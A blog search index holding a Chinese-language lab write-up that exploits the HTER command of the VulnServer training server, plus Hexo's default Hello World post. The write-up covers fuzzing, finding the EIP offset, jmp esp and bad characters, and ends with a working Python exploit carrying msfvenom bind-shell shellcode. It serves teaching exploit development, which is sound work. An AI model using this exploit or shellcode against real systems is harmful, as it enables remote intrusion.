<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/01/VulnServer-HTER%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/02/01/VulnServer-HTER%E5%91%BD%E4%BB%A4%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="title-VulnServer–HTER命令漏洞-date-2024-02-01-01-03-55-tags-VulnServer"><a href="#title-VulnServer–HTER命令漏洞-date-2024-02-01-01-03-55-tags-VulnServer" class="headerlink" title="title: VulnServer–HTER命令漏洞 date: 2024-02-01 01:03:55 tags:VulnServer"></a>title: VulnServer–HTER命令漏洞 date: 2024-02-01 01:03:55 tags:VulnServer</h2><hr><p>VulnServer 是一个模拟漏洞的服务器软件，本篇学习的是HTER的编码漏洞</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li><p>操作系统：Windows XP Professional &amp; kali</p></li><li><p>软件：VulnServer</p></li><li><p>工具：Immunity Debugger 配合mona、科来、Python、Spike Fuzzer、MSF</p></li></ul><h2 id="实践目的和内容"><a href="#实践目的和内容" class="headerlink" title="实践目的和内容"></a>实践目的和内容</h2><ul><li><p>目的：掌握十六进制和Unicode 编码下的漏洞利用原理和方法。</p></li><li><p>内容：针对漏洞服务器VulnServer 的HTER 命令，使用SpikeFuzz 进行漏洞挖掘、分析和利用。</p></li></ul><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><ul><li>远程<strong>栈缓冲区溢出</strong>漏洞。在这个命令中，攻击者可以通过发送特制的十六进制字符串，触发栈缓冲区溢出，通过覆盖函数调用栈上的关键数据，如返回地址，来控制程序的执行流程。</li></ul><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li><p>VulnServer是一个用于学习和测试漏洞的模拟工具，它提供了一个教学和测试环境，以帮助研究人员理解在处理数据时可能出现的潜在问题。</p></li><li><p>如果服务器端在<strong>接收十六进制数据时没有进行足够的输入验证</strong>，或者在分配缓冲区存储解码后的数据时没有正确计算数据的长度，就可能导致缓冲区溢出。攻击者可能通过构造特定的输入，触发这类问题，从而利用潜在的漏洞。</p></li><li><p>这个项目主要是体现如果是十六进制编码储存到内存中，我们在定位EIP、检测坏字节和生成shellcode这些处理方式上会有所不同，但总体还是一个缓冲区溢出漏洞的利用思路</p></li></ul><h2 id="实践步骤"><a href="#实践步骤" class="headerlink" title="实践步骤"></a>实践步骤</h2><h3 id="模糊测试，触发漏洞"><a href="#模糊测试，触发漏洞" class="headerlink" title="模糊测试，触发漏洞"></a>模糊测试，触发漏洞</h3><ul><li><p>在XP系统上用Immunity Debugger附加运行VulnServer.exe，Kali上编写hter.spk并进行模糊测试 <img src="/.com//7ee8b8e0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>同时在宿主机上编辑设置捕获过滤器 <img src="/.com//a6014460-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"><img src="/.com//be0556a0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>可以看到程序崩溃，服务器没有响应，然后我们打开科来网络分析系统查看数据包。一个个查看找到最后一个服务器和客户端有交互的会话。因为连接上之后服务端就会发送一次欢迎信息，所以崩溃的那一次连接应该是最后一次服务端有发送信息的会话。查看最后一次响应的会话，果然如此，服务端在接受了客户端的一长串A字符之后崩溃了。 <img src="/.com//c52ab6f0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>复制客户端发送的信息用UltraEdit打开查看是2050个字符<img src="/.com//ca22aff0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li></ul><h3 id="POC验证，确定偏移量"><a href="#POC验证，确定偏移量" class="headerlink" title="POC验证，确定偏移量"></a>POC验证，确定偏移量</h3><ul><li><p>这里尝试将最后两个符号也换成A，然后写一个POC进行验证。 <img src="/.com//cf9704e0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image">!<img src="/.com//d6b623a0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>对应的结果，验证了漏洞。而且可以看到EIP被我们输入的A全部覆盖了，说明这个漏洞存在利用的可能。由于此时ESP的值<code>0x00BDFA0C</code>指向的是我们覆盖的A后面一个空间，这样我们无法利用。所以我们考虑再增大输入测试一下，一般的shellcode为350~500字节，所以我们直接加到3000。 <img src="/.com//e0efefe0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>程序崩溃，此时ESP指向的地址已经被我们输入的A完全覆盖，然后判断这里ESP后面可用空间大小为1D8，按说一般够用。为了保险，我这里测试了3500个A，看到有2D4也就是大概724个字节，完全足够。所以用3500个A，然后将shellcode放在ESP后面。</p><p><img src="/.com//e611b800-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>接下来就是定位EIP的位置。这里要注意的是，EIP的显示不太正常，这里显示的是8个A，也就是把我们输入的十六进制数据显示出来。因此我们无法采用唯一字符串的方法来定位EIP，所以采用二分法。</p></li><li><p>1700个A和1800个B时：可以看到EIP被B全部覆盖，说明A的数量少了。 <img src="/.com//edff7160-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>因为我们前面试过2050时，EIP会被A全部覆盖，所以这一次我们尝试1900个A。可以看到A还是少了 <img src="/.com//f73b55a0-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>那么再尝试2000个A和1500个B，看到还是少了，但是在逐渐逼近 !<img src="/.com//fcf2f520-c058-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>2025个A和1425个B时，少了 <img src="/.com//03055ed0-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>2040个A和1460个B，差一点点： <img src="/.com//06476a70-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image">!</p></li><li><p>2045个A和1455个B，发现四个A和四个B覆盖了EIP，就快找到了！： <img src="/.com//09ab55f0-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>逐渐减少一个A，EIP就少一个A，所以偏移地址应该是B的开头，也就是2042到2049： <img src="/.com//0ed00440-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"> !<img src="/.com//13a5cf40-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>用<code>poc = b&#39;\x41&#39; * 2041 + b&#39;\x42&#39; * 8 + b&#39;\x43&#39; * (3000 - 2041 - 8) </code>验证，刚好2042到2049被8个B精准覆盖（因为这里十六进制直接显示所以是8个字节），而且ESP指向的就是C的位置所以我们后面就可以找跳转指令的地址覆盖2042到2049，然后把shellcode放在C区域： <img src="/.com//181648c0-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li></ul><h3 id="寻找jmp-esp"><a href="#寻找jmp-esp" class="headerlink" title="寻找jmp esp"></a>寻找jmp esp</h3><ul><li><p>用<code>!mona jmp -r esp</code>查找可用的jmp指令 <img src="/.com//2214b9b0-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"><img src="/.com//3e946900-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>查看mona生成的jmp.txt，看到前面几个jmp显示的都是False，而且是程序自己的dll，应该会运行。所以随便选一个，我这里选最后一个<code>0x625011F7</code>。由于HTER会在内存里面十六进制编码，所以我们直接写入，又因为是高位在后低位在前，所以要写<code>0xF7115062</code></p></li><li><p>在immunity debugger中加断点，运行上面脚本，程序会在断点<code>0x625011F7</code>处截断。EIP被覆盖为<code>0x625011F7</code>esp指向C区域，所以下一步应该就会跳转到C区域执行。验证一下，F8单步运行，结果如我们所料 <img src="/.com//727e82a0-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"><img src="/.com//77c3ff60-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li></ul><h3 id="寻找坏字符badchar"><a href="#寻找坏字符badchar" class="headerlink" title="寻找坏字符badchar"></a>寻找坏字符badchar</h3><ul><li>接下来寻找坏字节，确保我们的shellcode能“正确”运行，因为00一般都会截断，我们直接从01开始。（从01到ff一共255个，是一个内存单元一般能表示的所有值）。将badchar加到poc里面执行。immuDebugger检查坏字节。可以看出只有00会被截断，因此我们要在生成的shellcode里面排除00 <img src="/.com//7e72f730-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"><img src="/.com//82b0a0e0-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></li></ul><h3 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h3><ul><li><p>用msfvenom生成shellcode如下，该shellcode作用是生成一个4444端口的等待连接的TCP连接。<img src="/.com//8741c1c0-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>放到脚本里运行验证，连接成功！ <img src="/.com//8c644d30-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"><img src="/.com//8f65cd60-c059-11ee-8d29-05f92cb1b558.jpeg?v=1&type=image"></p></li><li><p>最后的exp如下：</p></li></ul><!----><pre><code class="hljs">import socketjmpesp = b&#39;F7115062&#39;shellcode = &quot;bf83927abcd9c2d97424f45a31c9b153317a12037a1283696e98499167dfb26978803b8c498058c5fa302a8bf6bb7e3f8cce56302564817fb6d5f11e342426c005e73b01411ab1531a5064432f2cb5e863a0bd0d33c3ec804f9a2e238396663bc09331b0326fc0100b906f5da363719a049c04d276211f2104fdaab1ae760c1d4e5acbd65c179fb040a64ccb7d23731bf47750bf5c23f9e6388206f8e27ba3730e6fdede475cd3e097ca6493a555df3b861ef9bce934bd5214b7be7bd3e3ee13f28b64e3fb5910eb5a3207161ce287b8f5e807e7e612c2808feeedbf13660bd5bb2e83417e151cf6817f3490ca69839fcabfa33741ac772656f9df3fc1778e7273879be4101a40f45f07dfa308f91621a5a080573434ead3e385f5da66b1d1ccbe3a5eb86e6d0816c9c7fac083b4548452f766d25ad2103aea8b6445c35b613e39fc8e95f91c6d3ff4b428aab5d8ca01f9e448a3821250c6875fd63bfaf0b33ba9f191&quot;poc = b&#39;\x41&#39; * 2041 + jmpesp + b&#39;90&#39; * 8 + shellcode.encode(&#39;Latin-1&#39;) + b&#39;90&#39; * 8 + b&#39;\x43&#39; * (3500 - 2041 - 8 * 3 - len(shellcode))s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)connect = s.connect((&#39;192.168.242.133&#39;, 9999))msg1 = s.recv(1024)print(poc)print(msg1)s.send(b&#39;HTER &#39; + poc + b&#39;/r/n&#39;)// 这里的“HTER ”中一定要有空格，不然服务器会出现10052的接收数据错误。</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/01/30/hello-world/"/>
    <url>/2024/01/30/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
